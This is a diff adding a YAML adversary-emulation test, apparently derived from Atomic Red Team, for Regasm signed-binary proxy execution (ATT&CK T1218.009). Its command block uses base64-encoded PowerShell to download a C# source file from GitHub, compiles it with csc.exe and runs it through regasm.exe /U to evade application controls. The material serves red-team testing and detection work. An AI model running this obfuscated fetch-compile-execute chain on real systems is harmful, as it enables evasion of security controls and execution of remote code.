@@ -1,0 +1,21 @@
+- id: b0ce419e-79ec-5f6b-96e3-a68d15cc90c6
+  name: Soumaia ART Tests - Regasm Uninstall Method Call Test
+  description: Executes the Uninstall Method, No Admin Rights Required. Upon execution, "I shouldn't really execute either." will be displayed.
+  tactic: stealth
+  technique:
+    attack_id: T1218.009
+    name: 'Signed Binary Proxy Execution: Regsvcs/Regasm'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFQAMQAyADEAOAAuADAAMAA5AC4AYwBzACIAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABUADEAMgAxADgALgAwADAAOQAuAGMAcwAiACkAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAGkAZwBuAG8AcgBlACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwByAGUAZABjAGEAbgBhAHIAeQBjAG8ALwBhAHQAbwBtAGkAYwAtAHIAZQBkAC0AdABlAGEAbQAvAHIAYQB3AC8AbQBhAHMAdABlAHIALwBhAHQAbwBtAGkAYwBzAC8AVAAxADIAMQA4AC4AMAAwADkALwBzAHIAYwAvAFQAMQAyADEAOAAuADAAMAA5AC4AYwBzACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXABUADEAMgAxADgALgAwADAAOQAuAGMAcwAiAAoA
+          )
+          C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:"%tmp%\T1218.009.dll" /target:library ".\T1218.009.cs"
+          C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U %tmp%\T1218.009.dll
+        cleanup: |-
+          del %tmp%\T1218.009.dll >nul 2>&1
+        payloads:
+        - T1218.009.cs
